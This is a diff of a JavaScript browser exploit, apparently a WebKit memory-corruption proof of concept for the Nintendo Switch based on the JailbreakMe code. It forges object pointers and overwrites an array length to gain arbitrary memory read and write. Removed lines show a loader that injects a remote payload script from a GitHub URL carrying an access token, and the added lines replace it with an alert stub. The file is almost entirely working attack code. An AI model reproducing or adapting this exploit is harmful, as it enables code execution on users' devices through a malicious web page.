@@ -1,7 +1,7 @@
 // Based on https://jbme.qwertyoruiop.com/
 // and lookout PoC code.
 var bufs = new Array(1000);
-///
+//
 
 
 var trycatch = "";
@@ -99,10 +99,7 @@ function allocbufptrs() {
 }
 
 function smashed(stl) {
-  alert("Loading payload");
-  var x = document.createElement('script');
-  x.src = 'https://raw.githubusercontent.com/slimsag/switchpoc/master/payload.js?token=AIMi8uOhXiZKZj_G3GIby3vXtv0ultOiks5Yz0qNwA%3D%3D&cb=' + math.random();
-  document.getElementsByTagName("head")[0].appendChild(x);
+	alert("Arbitrary code execution here.")
 	return 0;
 }
 
@@ -173,12 +170,11 @@ function go_() {
 			// Check if this is what the stale object points to (0x4141414 + 0x101 == 0x41414242)
 			// If this is true then stale[0] points to the same thing as bufs[i][k]
 			if(bufs[i][k] == 0x41414242) {
-				// Create fakeobj for fixing butterfly
-				var fakeobj = {};
-				
-				stale[0] = fakeobj;
-				var fop = bufs[i][k];
-				
+				// Create fakeobj for fixing butterfly ptraaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+
+
+ 				
+
 				stale[0] = {
 					'a': u2d(105, 0x1172600), // the JSObject properties
 					'b': u2d(0, 0), // Butterfly ptr
@@ -205,20 +201,23 @@ function go_() {
 					stale[0][5] == second32(butterflyptr)
 					stale[0][6] == m_length
 				*/
-				stale[0][6] = 0xffffffff; // Overide m_length field
 
+				
+				//alert("Accesing stale[0]");
+				//var x = stale[0];
+				//alert("Accesing stale[0]");
+				
+				//alert("Orginal smsh len:" + smsh.length);
+				stale[0][6] = 0xffffffff; // Overide m_length field
+				//alert("New smsh len:" + smsh.length);
+				
+				// Adding new code here
 				bck = stale[0][4];
 				stale[0][4] = 0; // address, low 32 bits
 				mem0 = stale[0];
  				mem1 = bck;
  				mem2 = smsh;
  				bufs.push(stale)
-				
-				write4((bufs[i][k] - 0x10), read4(fop)); 
-				write4((bufs[i][k] - 0x10) + 4, read4(fop + 4));
-				fakeobj['a'] = 1;
-				write4(bufs[i][k] + 0x08, 0);
-				write4(bufs[i][k] + 0x0C, 0);
 				
  				if (smsh.length != 0x10) {
  					smashed(stale[0]);
@@ -234,6 +233,7 @@ function go_() {
  				
 
 				*/
+				
 				return;
 			}
 		}
